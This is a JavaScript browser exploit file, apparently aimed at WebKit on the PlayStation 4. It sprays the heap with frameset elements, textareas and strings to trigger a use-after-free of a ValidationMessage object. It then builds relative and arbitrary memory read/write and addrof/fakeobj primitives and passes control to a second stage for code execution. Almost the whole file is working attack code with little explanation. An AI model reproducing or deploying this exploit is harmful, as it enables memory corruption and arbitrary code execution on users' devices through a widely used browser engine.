function int64(low, hi) {
    this.low = (low >>> 0);
    this.hi = (hi >>> 0);
    this.add32inplace = function (val) {
var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
var new_hi = (this.hi >>> 0);

if (new_lo < this.low) {
    new_hi++;
}
this.hi = new_hi;
this.low = new_lo;
    }
    this.add32 = function (val) {
var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
var new_hi = (this.hi >>> 0);

if (new_lo < this.low) {
    new_hi++;
}

return new int64(new_lo, new_hi);
    }
    this.sub32 = function (val) {
var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
var new_hi = (this.hi >>> 0);

if (new_lo > (this.low) & 0xFFFFFFFF) {
    new_hi--;
}

return new int64(new_lo, new_hi);
    }
    this.add64 = function(val) {
var new_lo = (((this.low >>> 0) + val.low) & 0xFFFFFFFF) >>> 0;
var new_hi = (this.hi >>> 0);

if (new_lo > (this.low) & 0xFFFFFFFF) {
    new_hi++;
}
new_hi = (((new_hi >>> 0) + val.hi) & 0xFFFFFFFF) >>> 0;
return new int64(new_lo, new_hi);
    }
    this.sub64 = function(val) {
var new_lo = (((this.low >>> 0) - val.low) & 0xFFFFFFFF) >>> 0;
var new_hi = (this.hi >>> 0);

if (new_lo > (this.low) & 0xFFFFFFFF) {
    new_hi--;
}
new_hi = (((new_hi >>> 0) - val.hi) & 0xFFFFFFFF) >>> 0;
return new int64(new_lo, new_hi);
    }
    this.sub32inplace = function (val) {
var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
var new_hi = (this.hi >>> 0);

if (new_lo > (this.low) & 0xFFFFFFFF) {
    new_hi--;
}
this.hi = new_hi;
this.low = new_lo;
    }
    this.and32 = function (val) {
var new_lo = this.low & val;
var new_hi = this.hi;
return new int64(new_lo, new_hi);
    }
    this.and64 = function (vallo, valhi) {
var new_lo = this.low & vallo;
var new_hi = this.hi & valhi;
return new int64(new_lo, new_hi);
    }
    this.toString = function (val) {
val = 16;
var lo_str = (this.low >>> 0).toString(val);
var hi_str = (this.hi >>> 0).toString(val);

if (this.hi == 0)
    return lo_str;
else
    lo_str = zeroFill(lo_str, 8)

return hi_str + lo_str;
    }

    this.toPacked = function () {
return {
    hi: this.hi,
    low: this.low
};
    }

    this.setPacked = function (pck) {
this.hi = pck.hi;
this.low = pck.low;
return this;
    }

    return this;
}

function zeroFill(number, width) {
    width -= number.toString().length;

    if (width > 0) {
return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
    }

    return number + ""; // always return a string
}
function Int64(low, high) {
    var bytes = new Uint8Array(8);

    if (arguments.length > 2 || arguments.length == 0)
throw TypeError("Incorrect number of arguments to constructor");
    if (arguments.length == 2) {
if (typeof low != 'number' || typeof high != 'number') {
    throw TypeError("Both arguments must be numbers");
}
if (low > 0xffffffff || high > 0xffffffff || low < 0 || high < 0) {
    throw RangeError("Both arguments must fit inside a uint32");
}
low = low.toString(16);
for (let i = 0; i < 8 - low.length; i++) {
    low = "0" + low;
}
low = "0x" + high.toString(16) + low;
    }

    switch (typeof low) {
case 'number':
    low = '0x' + Math.floor(low).toString(16);
case 'string':
    if (low.substr(0, 2) === "0x")
low = low.substr(2);
    if (low.length % 2 == 1)
low = '0' + low;
    var bigEndian = unhexlify(low, 8);
    var arr = [];
    for (var i = 0; i < bigEndian.length; i++) {
arr[i] = bigEndian[i];
    }
    bytes.set(arr.reverse());
    break;
case 'object':
    if (low instanceof Int64) {
bytes.set(low.bytes());
    } else {
if (low.length != 8)
    throw TypeError("Array must have excactly 8 elements.");
bytes.set(low);
    }
    break;
case 'undefined':
    break;
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function () {
// Check for NaN
if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
    throw new RangeError("Can not be represented by a double");

return Struct.unpack(Struct.float64, bytes);
    };

    this.asInteger = function () {
if (bytes[7] != 0 || bytes[6] > 0x20) {
    debug_log("SOMETHING BAD HAS HAPPENED!!!");
    throw new RangeError(
"Can not be represented as a regular number");
}
return Struct.unpack(Struct.int64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function () {
if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[
    6] == 0xff))
    throw new RangeError(
"Can not be represented by a JSValue");

// For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
return Struct.unpack(Struct.float64, this.sub(0x1000000000000).bytes());
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function () {
var arr = [];
for (var i = 0; i < bytes.length; i++) {
    arr.push(bytes[i])
}
return arr;
    };

    // Return the byte at the given index.
    this.byteAt = function (i) {
return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function () {
var arr = [];
for (var i = 0; i < bytes.length; i++) {
    arr.push(bytes[i])
}
return '0x' + hexlify(arr.reverse());
    };

    this.low32 = function () {
return new Uint32Array(bytes.buffer)[0] >>> 0;
    };

    this.hi32 = function () {
return new Uint32Array(bytes.buffer)[1] >>> 0;
    };

    this.equals = function (other) {
if (!(other instanceof Int64)) {
    other = new Int64(other);
}
for (var i = 0; i < 8; i++) {
    if (bytes[i] != other.byteAt(i))
return false;
}
return true;
    };

    this.greater = function (other) {
if (!(other instanceof Int64)) {
    other = new Int64(other);
}
if (this.hi32() > other.hi32())
    return true;
else if (this.hi32() === other.hi32()) {
    if (this.low32() > other.low32())
return true;
}
return false;
    };
    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
return function () {
    if (arguments.length != nargs)
throw Error("Not enough arguments for function " + f.name);
    var new_args = [];
    for (var i = 0; i < arguments.length; i++) {
if (!(arguments[i] instanceof Int64)) {
    new_args[i] = new Int64(arguments[i]);
} else {
    new_args[i] = arguments[i];
}
    }
    return f.apply(this, new_args);
};
    }

    this.neg = operation(function neg() {
var ret = [];
for (var i = 0; i < 8; i++)
    ret[i] = ~this.byteAt(i);
return new Int64(ret).add(Int64.One);
    }, 0);

    this.add = operation(function add(a) {
var ret = [];
var carry = 0;
for (var i = 0; i < 8; i++) {
    var cur = this.byteAt(i) + a.byteAt(i) + carry;
    carry = cur > 0xff | 0;
    ret[i] = cur;
}
return new Int64(ret);
    }, 1);

    this.assignAdd = operation(function assignAdd(a) {
var carry = 0;
for (var i = 0; i < 8; i++) {
    var cur = this.byteAt(i) + a.byteAt(i) + carry;
    carry = cur > 0xff | 0;
    bytes[i] = cur;
}
return this;
    }, 1);


    this.sub = operation(function sub(a) {
var ret = [];
var carry = 0;
for (var i = 0; i < 8; i++) {
    var cur = this.byteAt(i) - a.byteAt(i) - carry;
    carry = cur < 0 | 0;
    ret[i] = cur;
}
return new Int64(ret);
    }, 1);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function (d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);
Int64.NegativeOne = new Int64(0xffffffff, 0xffffffff);
function die(msg) {
	alert(msg);
	undefinedFunction();
}

function debug_log(msg) {
	let textNode = document.createTextNode(msg);
	let node = document.createElement("p").appendChild(textNode);

	document.body.appendChild(node);
	document.body.appendChild(document.createElement("br"));
}

// The following functions are taken from https://github.com/saelo/jscpwn/:
//  hex, hexlify, unhexlify, hexdump
//  Copyright (c) 2016 Samuel Groß

// Return the hexadecimal representation of the given byte.
function hex(b) {
	return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
	var res = [];
	for (var i = 0; i < bytes.length; i++)
		res.push(hex(bytes[i]));

	return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
	if (hexstr.length % 2 == 1)
		throw new TypeError("Invalid hex string");

	var bytes = new Uint8Array(hexstr.length / 2);
	for (var i = 0; i < hexstr.length; i += 2)
		bytes[i / 2] = parseInt(hexstr.substr(i, 2), 16);

	return bytes;
}

function hexdump(data) {
	if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
		data = Array.from(data);

	var lines = [];
	for (var i = 0; i < data.length; i += 16) {
		var chunk = data.slice(i, i + 16);
		var parts = chunk.map(hex);
		if (parts.length > 8)
			parts.splice(8, 0, ' ');
		lines.push("" + i.toString(16) + " : " + parts.join(' '));
		// lines.push(parts.join(' '));
	}

	return lines.join('\n');
}

function buf2hex(buffer) {
	return Array.prototype.map.call(new Uint8Array(buffer), x => ('00' + x.toString(16)).slice(-2)).join('');
}

// Simplified version of the similarly named python module.
var Struct = (function () {
	// Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
	var buffer = new ArrayBuffer(8);
	var byteView = new Uint8Array(buffer);
	var uint32View = new Uint32Array(buffer);
	var float64View = new Float64Array(buffer);

	return {
		pack: function (type, low, high) {
			var view = type;
			view[0] = low;
			/*if (arguments.length == 2) {
				view[1] = high;
			}*/
			return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
		},

		unpack: function (type, bytes) {
			if (bytes.length !== type.BYTES_PER_ELEMENT)
				throw Error("Invalid bytearray");

			var view = type;// See below
			byteView.set(bytes);
			return view[0];
		},

		// Available types.
		int8: byteView,
		int32: uint32View,
		float64: float64View
	};
})();

var backingBuffer = new ArrayBuffer(8);
var f = new Float32Array(backingBuffer);
var i = new Uint32Array(backingBuffer);

function i2f(num) {
	i[0] = num;
	return f[0];
}

function f2i(num) {
	f[0] = num;
	return i[0];
}

function str2array(str, length, offset) {
	if (offset === undefined)
		offset = 0;
	var a = new Array(length);
	for (var i = 0; i < length; i++) {
		a[i] = str.charCodeAt(i + offset);
	}
	return a;
}
const OFFSET_ELEMENT_REFCOUNT = 0x10;
const OFFSET_JSAB_VIEW_VECTOR = 0x10;
const OFFSET_JSAB_VIEW_LENGTH = 0x18;
const OFFSET_LENGTH_STRINGIMPL = 0x04;
const OFFSET_HTMLELEMENT_REFCOUNT = 0x14;

const LENGTH_ARRAYBUFFER = 0x8;
const LENGTH_STRINGIMPL = 0x14;
const LENGTH_JSVIEW = 0x20;
const LENGTH_VALIDATION_MESSAGE = 0x30;
const LENGTH_TIMER = 0x48;
const LENGTH_HTMLTEXTAREA = 0xd8;

const SPRAY_ELEM_SIZE = 0x6000;
const SPRAY_STRINGIMPL = 0x1000;

const NB_FRAMES = 0xfa0;
const NB_REUSE = 0x8000;

var g_arr_ab_1 = [];
var g_arr_ab_2 = [];
var g_arr_ab_3 = [];

var g_frames = [];

var g_relative_read = null;
var g_relative_rw = null;
var g_ab_slave = null;
var g_ab_index = null;

var g_timer_leak = null;
var g_jsview_leak = null;
var g_jsview_butterfly = null;
var g_message_heading_leak = null;
var g_message_body_leak = null;

var g_obj_str = {};

var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";

var g_round = 1;
var g_input = null;

var guess_htmltextarea_addr = new Int64("0x2031b00d8");

var master_b = new Uint32Array(2);
var slave_b =  new Uint32Array(2);
var slave_addr;
var slave_buf_addr;
var master_addr;


/* Executed after deleteBubbleTree */
function setupRW() {
	/* Now the m_length of the JSArrayBufferView should be 0xffffff01 */
	for (let i = 0; i < g_arr_ab_3.length; i++) {
		if (g_arr_ab_3[i].length > 0xff) {
			g_relative_rw = g_arr_ab_3[i];
			debug_log("[+] Succesfully got a relative R/W");
			break;
		}
	}
	if (g_relative_rw === null)
		die("[!] Failed to setup a relative R/W primitive");

	debug_log("[+] Setting up arbitrary R/W");

	/* Retrieving the ArrayBuffer address using the relative read */
	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + OFFSET_JSAB_VIEW_VECTOR));

	/* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
	let ab_index = g_jsview_leak.sub(ab_addr).low32();
	if (g_relative_rw[ab_index + LENGTH_JSVIEW + OFFSET_JSAB_VIEW_LENGTH] === LENGTH_ARRAYBUFFER)
		g_ab_index = ab_index + LENGTH_JSVIEW;
	else
		g_ab_index = ab_index - LENGTH_JSVIEW;

	/* Overding the length of one JSArrayBufferView with a known value */
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0x41;

	/* Looking for the slave JSArrayBufferView */
	for (let i = 0; i < g_arr_ab_3.length; i++) {
		if (g_arr_ab_3[i].length === 0x41) {
			g_ab_slave = g_arr_ab_3[i];
			g_arr_ab_3 = null;
			break;
		}
	}
	if (g_ab_slave === null)
		die("[!] Didn't found the slave JSArrayBufferView");

	/* Extending the JSArrayBufferView length */
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 1] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 2] = 0xff;
	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 0xff;

	debug_log("[+] Testing arbitrary R/W");

	let saved_vtable = read64(guess_htmltextarea_addr);
	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
		die("[!] Failed to setup arbitrary R/W primitive");

	debug_log("[+] Succesfully got arbitrary R/W!");

	/* Restore the overidden vtable pointer */
	write64(guess_htmltextarea_addr, saved_vtable);

	/* Cleanup memory */
	cleanup();

	/* Set up addrof/fakeobj primitives */
	g_ab_slave.leakme = 0x1337;
	var bf = 0;
	for(var i = 15; i >= 8; i--)
		bf = 256 * bf + g_relative_rw[g_ab_index + i];
	g_jsview_butterfly = new Int64(bf);
	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
		die("[!] Failed to setup addrof/fakeobj primitives");
	debug_log("[+] Succesfully got addrof/fakeobj");

	/* Getting code execution */
	/* ... */
	var leak_slave = addrof(slave_b);
	var slave_addr = read64(leak_slave.add(0x10));

	og_slave_addr = new int64(slave_addr.low32(), slave_addr.hi32());
	var leak_master = addrof(master_b);
	write64(leak_master.add(0x10), leak_slave.add(0x10));
	var prim = {
		write8: function(addr, val) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;

			if(val instanceof int64) {
				slave_b[0] = val.low;
				slave_b[1] = val.hi;
			}
			else {
				slave_b[0] = val;
				slave_b[1] = 0;
			}

			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
		},
		write4: function(addr, val) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;

			slave_b[0] = val;

			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
		},
		read8: function(addr) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;
			var r = new int64(slave_b[0], slave_b[1]);
			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
			return r;
		},
		read4: function(addr) {
			master_b[0] = addr.low;
			master_b[1] = addr.hi;
			var r = slave_b[0];
			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
			return r;
		},
		leakval: function(val) {
			g_ab_slave.leakme = val;
			master_b[0] = g_jsview_butterfly.low32() - 0x10;
			master_b[1] = g_jsview_butterfly.hi32();
			var r = new int64(slave_b[0], slave_b[1]);
			master_b[0] = og_slave_addr.low;
			master_b[1] = og_slave_addr.hi;
			return r;
		},
	};
	window.prim = prim;
	setTimeout(stage2, 1000);
}

function read(addr, length) {
	for (let i = 0; i < 8; i++)
		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
	let arr = [];
	for (let i = 0; i < length; i++)
		arr.push(g_ab_slave[i]);
	return arr;
}

function read64(addr) {
	return new Int64(read(addr, 8));
}

function write(addr, data) {
	for (let i = 0; i < 8; i++)
		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
	for (let i = 0; i < data.length; i++)
		g_ab_slave[i] = data[i];
}

function write64(addr, data) {
	write(addr, data.bytes());
}

function addrof(obj) {
	g_ab_slave.leakme = obj;
	return read64(g_jsview_butterfly.sub(16));
}

function fakeobj(addr) {
	write64(g_jsview_butterfly.sub(16), addr);
	return g_ab_slave.leakme;
}

function cleanup() {
	select1.remove();
	select1 = null;
	input1.remove();
	input1 = null;
	input2.remove();
	input2 = null;
	input3.remove();
	input3 = null;
	div1.remove();
	div1 = null;
	g_input = null;
	g_rows1 = null;
	g_rows2 = null;
	g_frames = null;
}

/*
 * Executed after buildBubbleTree
 * and before deleteBubbleTree
 */
function confuseTargetObjRound2() {
	if (findTargetObj() === false)
		die("[!] Failed to reuse target obj.");

	g_fake_validation_message[4] = g_jsview_leak.add(OFFSET_JSAB_VIEW_LENGTH + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();

	setTimeout(setupRW, 6000);
}


/* Executed after deleteBubbleTree */
function leakJSC() {
	debug_log("[+] Looking for the smashed StringImpl...");

	var arr_str = Object.getOwnPropertyNames(g_obj_str);

	/* Looking for the smashed string */
	for (let i = arr_str.length - 1; i > 0; i--) {
		if (arr_str[i].length > 0xff) {
			debug_log("[+] StringImpl corrupted successfully");
			g_relative_read = arr_str[i];
			g_obj_str = null;
			break;
		}
	}
	if (g_relative_read === null)
		die("[!] Failed to setup a relative read primitive");

	debug_log("[+] Got a relative read");

var tmp_spray = {};
for(var i = 0; i < 100000; i++)
tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;

	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);

	/* Spraying JSView */
	let tmp = [];
	for (let i = 0; i < 0x10000; i++) {
		/* The last allocated are more likely to be allocated after our relative read */
		if (i >= 0xfc00)
			g_arr_ab_3.push(new Uint8Array(ab));
		else
			tmp.push(new Uint8Array(ab));
	}
	tmp = null;

	/*
	 * Force JSC ref on FastMalloc Heap
	 * https://github.com/Cryptogenic/PS4-5.05-Kernel-Exploit/blob/master/expl.js#L151
	 */
	var props = [];
	for (var i = 0; i < 0x400; i++) {
		props.push({ value: 0x42424242 });
		props.push({ value: g_arr_ab_3[i] });
	}

	/* 
	 * /!\
	 * This part must avoid as much as possible fastMalloc allocation
	 * to avoid re-using the targeted object 
	 * /!\ 
	 */
	/* Use relative read to find our JSC obj */
	/* We want a JSView that is allocated after our relative read */
	while (g_jsview_leak === null) {
		Object.defineProperties({}, props);
		for (let i = 0; i < 0x800000; i++) {
			var v = undefined;
			if (g_relative_read.charCodeAt(i) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x01) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x02) === 0x42 &&
				g_relative_read.charCodeAt(i + 0x03) === 0x42) {
				if (g_relative_read.charCodeAt(i + 0x08) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x0f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x10) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x17) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x18) === 0x0e &&
					g_relative_read.charCodeAt(i + 0x1f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x28) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x2f) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x30) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x37) === 0x00 &&
					g_relative_read.charCodeAt(i + 0x38) === 0x0e &&
					g_relative_read.charCodeAt(i + 0x3f) === 0x00)
					v = new Int64(str2array(g_relative_read, 8, i + 0x20));
				else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x11) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x12) === 0x42 &&
					g_relative_read.charCodeAt(i + 0x13) === 0x42)
					v = new Int64(str2array(g_relative_read, 8, i + 8));
			}
			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
				g_jsview_leak = v;
				props = null;
				break;
			}
		}
	}
	/* 
	 * /!\
	 * Critical part ended-up here
	 * /!\ 
	 */

	debug_log("[+] JSArrayBufferView: " + g_jsview_leak);

	/* Run the exploit again */
	prepareUAF();
}

/*
 * Executed after buildBubbleTree
 * and before deleteBubbleTree
 */
function confuseTargetObjRound1() {
	/* Force allocation of StringImpl obj. beyond Timer address */
	sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);

	/* Checking for leaked data */
	if (findTargetObj() === false)
		die("[!] Failed to reuse target obj.");

	dumpTargetObj();

	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();

	/*
	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
	 * the next 5s
	 */
	setTimeout(leakJSC, 6000);
}

function handle2() {
	/* focus elsewhere */
	input2.focus();
}

function reuseTargetObj() {
	/* Delete ValidationMessage instance */
	document.body.appendChild(g_input);

	/*
	 * Free ValidationMessage neighboors.
	 * SmallLine is freed -> SmallPage is cached
	 */
	for (let i = NB_FRAMES / 2 - 0x10; i < NB_FRAMES / 2 + 0x10; i++)
		g_frames[i].setAttribute("rows", ',');

	/* Get back target object */
	for (let i = 0; i < NB_REUSE; i++) {
		let ab = new ArrayBuffer(LENGTH_VALIDATION_MESSAGE);
		let view = new Float64Array(ab);

		view[0] = guess_htmltextarea_addr.asDouble();   // m_element
		view[3] = guess_htmltextarea_addr.asDouble();   // m_bubble

		g_arr_ab_1.push(view);
	}

	if (g_round == 1) {
		/*
		 * Spray a couple of StringImpl obj. prior to Timer allocation
		 * This will force Timer allocation on same SmallPage as our Strings
		 */
		sprayStringImpl(0, SPRAY_STRINGIMPL);

		g_frames = [];
		g_round += 1;
		g_input = input3;

		setTimeout(confuseTargetObjRound1, 10);
	} else {
		setTimeout(confuseTargetObjRound2, 10);
	}
}

function dumpTargetObj() {
	debug_log("[+] m_timer: " + g_timer_leak);
	debug_log("[+] m_messageHeading: " + g_message_heading_leak);
	debug_log("[+] m_messageBody: " + g_message_body_leak);
}

function findTargetObj() {
	for (let i = 0; i < g_arr_ab_1.length; i++) {
		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
			debug_log("[+] Found fake ValidationMessage");

			if (g_round === 2) {
				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
				g_round++;
			}

			g_fake_validation_message = g_arr_ab_1[i];
			g_arr_ab_1 = [];
			return true;
		}
	}
	return false;
}

function prepareUAF() {
	g_input.setCustomValidity("ps4");

	for (let i = 0; i < NB_FRAMES; i++) {
		var element = document.createElement("frameset");
		g_frames.push(element);
	}

	g_input.reportValidity();
	var div = document.createElement("div");
	document.body.appendChild(div);
	div.appendChild(g_input);

	/* First half spray */
	for (let i = 0; i < NB_FRAMES / 2; i++)
		g_frames[i].setAttribute("rows", g_rows1);

	/* Instantiate target obj */
	g_input.reportValidity();

	/* ... and the second half */
	for (let i = NB_FRAMES / 2; i < NB_FRAMES; i++)
		g_frames[i].setAttribute("rows", g_rows2);

	g_input.setAttribute("onfocus", "reuseTargetObj()");
	g_input.autofocus = true;
}

/* HTMLElement spray */
function sprayHTMLTextArea() {
	debug_log("[+] Spraying HTMLTextareaElement ...");

	let textarea_div_elem = document.createElement("div");
	document.body.appendChild(textarea_div_elem);
	textarea_div_elem.id = "div1";
	var element = document.createElement("textarea");

	/* Add a style to avoid textarea display */
	element.style.cssText = 'display:block-inline;height:1px;width:1px;visibility:hidden;';

	/*
	 * This spray is not perfect, "element.cloneNode" will trigger a fastMalloc
	 * allocation of the node attributes and an IsoHeap allocation of the
	 * Element. The virtual page layout will look something like that:
	 * [IsoHeap] [fastMalloc] [IsoHeap] [fastMalloc] [IsoHeap] [...]
	 */
	for (let i = 0; i < SPRAY_ELEM_SIZE; i++)
		textarea_div_elem.appendChild(element.cloneNode());
}

/* StringImpl Spray */
function sprayStringImpl(start, end) {
	for (let i = start; i < end; i++) {
		let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 5) + i.toString().padStart(5, "0"));
		g_obj_str[s] = 0x1337;
	}
}

function go() {
	/* Init spray */
	sprayHTMLTextArea();

	g_input = input1;
	/* Shape heap layout for obj. reuse */
	prepareUAF();
}